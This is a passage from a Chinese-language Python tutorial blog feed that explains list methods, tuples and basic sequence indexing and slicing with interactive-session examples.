<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<h4 id="列表方法"><a href="#列表方法" class="headerlink" title="列表方法"></a>列表方法</h4><p>“方法”是捆绑在“对象”上的函数，对象可能是列表、整数、浮点数、字符串或者是字典……，这种函数的执行常常作用于其对象，调用方法的方式如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">对象<span class="token punctuation">.</span>方法名<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>既然列表也是一种对象，那么现在来介绍下列表有哪些方法</p>
<h5 id="append"><a href="#append" class="headerlink" title="append"></a>append</h5><p>append方法用于给列表在末尾追加一个元素：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h5><p>pop方法用于移除指定索引（默认为-1，即尾部）的元素，并且返回这个元素：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token number">3</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># 移除索引为0的元素</span>
<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>提示</strong>：利用append和pop可以实现计算机中十分常见的一种数据结构——栈，栈是一种后进先出（LIFO，Last In First Out）的数据结构，push操作把元素放入栈，像堆叠积木一样，pop操作把顶层的“积木”移除，也就是最后放置的元素最先拿出，把列表当作栈，只需用append方法实现push操作，用pop方法实现pop操作。本系列教程不涉及更深的数据结构的学习，有兴趣的读者可以找找课程学习。</p>
<h5 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h5><p>insert方法可以把元素插入到指定的索引之前：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用分片赋值也是可以的：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不过比起insert方法，分片赋值的方式可读性比较差</p>
<h5 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h5><p>remove方法用于移除列表中某个元素的第一个匹配项：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
ValueError<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">.</span>remove<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span> x <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">list</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>相信大家也看到，如果元素不存在，程序将抛出错误</p>
<h5 id="index"><a href="#index" class="headerlink" title="index"></a>index</h5><p>index方法用于返回某个元素的第一个匹配项的索引：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>同样的，如果元素不存在，则抛出错误：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
ValueError<span class="token punctuation">:</span> <span class="token number">5</span> <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">list</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="count"><a href="#count" class="headerlink" title="count"></a>count</h4><p>count方法用于数数，数什么数？数元素出现的次数：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token number">3</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
<span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="extend"><a href="#extend" class="headerlink" title="extend"></a>extend</h5><p>extend方法用于附加一个序列至列表末尾：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> a
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个操作类似于序列相加操作：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> a <span class="token operator">+</span> b
<span class="token operator">>></span><span class="token operator">></span> a
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是使用extend方法效率比较高</p>
<p>我们还可以使用分片赋值的方式来实现与extend相同的效果：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">=</span> b
<span class="token operator">>></span><span class="token operator">></span> a
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但这比起extend，可读性变差了，所以还是使用extend方法比较好</p>
<h5 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h5><p>reverse方法用于<strong>翻转</strong>列表：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果仅仅想得到翻转后的列表，而不修改原列表，可以使用反向索引的分片来实现：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>如果需要反向迭代列表，还可以使用reversed函数创建一个反向迭代列表的迭代器：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token number">5</span>
<span class="token number">4</span>
<span class="token number">3</span>
<span class="token number">2</span>
<span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">reversed</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 还可以使用list函数来将迭代器转换成列表</span>
<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h5><p>sort方法用于对列表进行排序。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>要注意的是这个方法是对原列表进行修改的，如果不想修改原列表而获取排序结果，可以使用sorted函数：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>sort方法还可以自定义排序的方式，比如把<code>10</code>排在<code>1</code>之前，把<code>&#39;a&#39;</code>排在<code>3</code>之前等等，在python2中只需提供一个参数，这个参数是一个比较函数，但是python3取消了这个参数，需要使用其它方式来自定义排序的方式，这里就不深入了解了，读者们可以去python官网查看文档学习。</p>
<hr>
<h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><p>元组的基本操作和列表一样，但是元组是不可修改的，所以没有append、remove等修改序列的方法，只有count和index方法。</p>
<p>基本操作如下：</p>
<p>创建元组：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> tuple_1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 空元组</span>
<span class="token operator">>></span><span class="token operator">></span> tuple_2 <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 空元组</span>
<span class="token operator">>></span><span class="token operator">></span> tuple_3 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span>
<span class="token operator">>></span><span class="token operator">></span> tuple_4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>索引元素：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>count、index方法：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token number">3</span>
<span class="token operator">>></span><span class="token operator">></span> x<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>还有分片、相加等通用序列操作，上节已介绍，这里不过多阐述</p>
<p>元组的意义在于：</p>
<ol>
<li>元组可以作为字典等<strong>映射</strong>类型的<strong>键</strong>，而列表不可以，因为键必须是不可变的，元组刚好就是不可变类型，而列表是可变类型。</li>
<li>函数返回多个值的时候，其实就是返回了一个元组，我们必须对元组进行处理。</li>
</ol>
<hr>
<p>好了，本节到此结束，下期再见！</p>
<p> <code>ヾ(￣▽￣)Bye~Bye~</code></p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（四）·序列</title>
    <url>/6fb3ca36/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>距离上次的小项目已经休息了很长一段时间，是时候来继续本系列教程了。这一节开始我们将深入python中的数据结构。</p>
<span id="more"></span>

<h3 id="序列的概念"><a href="#序列的概念" class="headerlink" title="序列的概念"></a>序列的概念</h3><p>在python中，最基本的数据结构是<strong>序列</strong>，序列包含一个或多个元素，每个元素有一个序号，也就是元素的位置，也称为索引。第一个索引是0，第二个是1，以此类推。</p>
<p>说到这里，可能大家都想到了列表。确实，python中有好几种内建（自带）的序列，列表就是其中一种，当然，元组也是。其他的内建序列类型有字符串、字节串等。</p>
<p>至于字符串，它其实就是一个由许多字符组成的序列，索引0指向第一个字符，索引1指向第二个字符……</p>
<p>本系列教程主要学习<strong>列表</strong>、<strong>元组</strong>、<strong>字符串</strong>这三种序列，字节串不详细讨论。</p>
<h3 id="通用序列操作"><a href="#通用序列操作" class="headerlink" title="通用序列操作"></a>通用序列操作</h3><p>所有的序列类型都有一些共同的操作，这些操作包括：<strong>索引</strong>、<strong>分片</strong>、<strong>加法</strong>、<strong>乘法</strong>还有检查某个元素是否包含在序列中。除此以外，python中还有一系列针对序列的内建函数。</p>
<h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><p>索引操作其实就是通过索引访问元素的操作，十分简单，况且之前也有提过，在这里直接给出例子：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> <span class="token string">'hello'</span>
<span class="token operator">>></span><span class="token operator">></span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># 正向索引</span>
<span class="token string">'h'</span>
<span class="token operator">>></span><span class="token operator">></span> s<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 反向索引</span>
<span class="token string">'o'</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>要注意的是，反向索引时，末尾元素的索引应该是-1，而不是-0，因为-0就是0，不然就与首元素索引重合了。</p>
<h4 id="分片"><a href="#分片" class="headerlink" title="分片"></a>分片</h4><p>索引只可以访问一个元素，而分片可以访问一定区间（范围）内的元素。分片通过冒号隔开的两个索引来实现，前一个索引表示起点（包括起点），后一个索引包括终点（不包括终点）：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> <span class="token string">'hello world'</span>
<span class="token operator">>></span><span class="token operator">></span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>
<span class="token string">'hello'</span>
<span class="token operator">>></span><span class="token operator">></span> lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> lst<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>省略第一个索引表示从首元素开始：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> lst<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>省略第二个索引表示索引的范围包含起点以及起点之后的<strong>所有</strong>元素：</p>
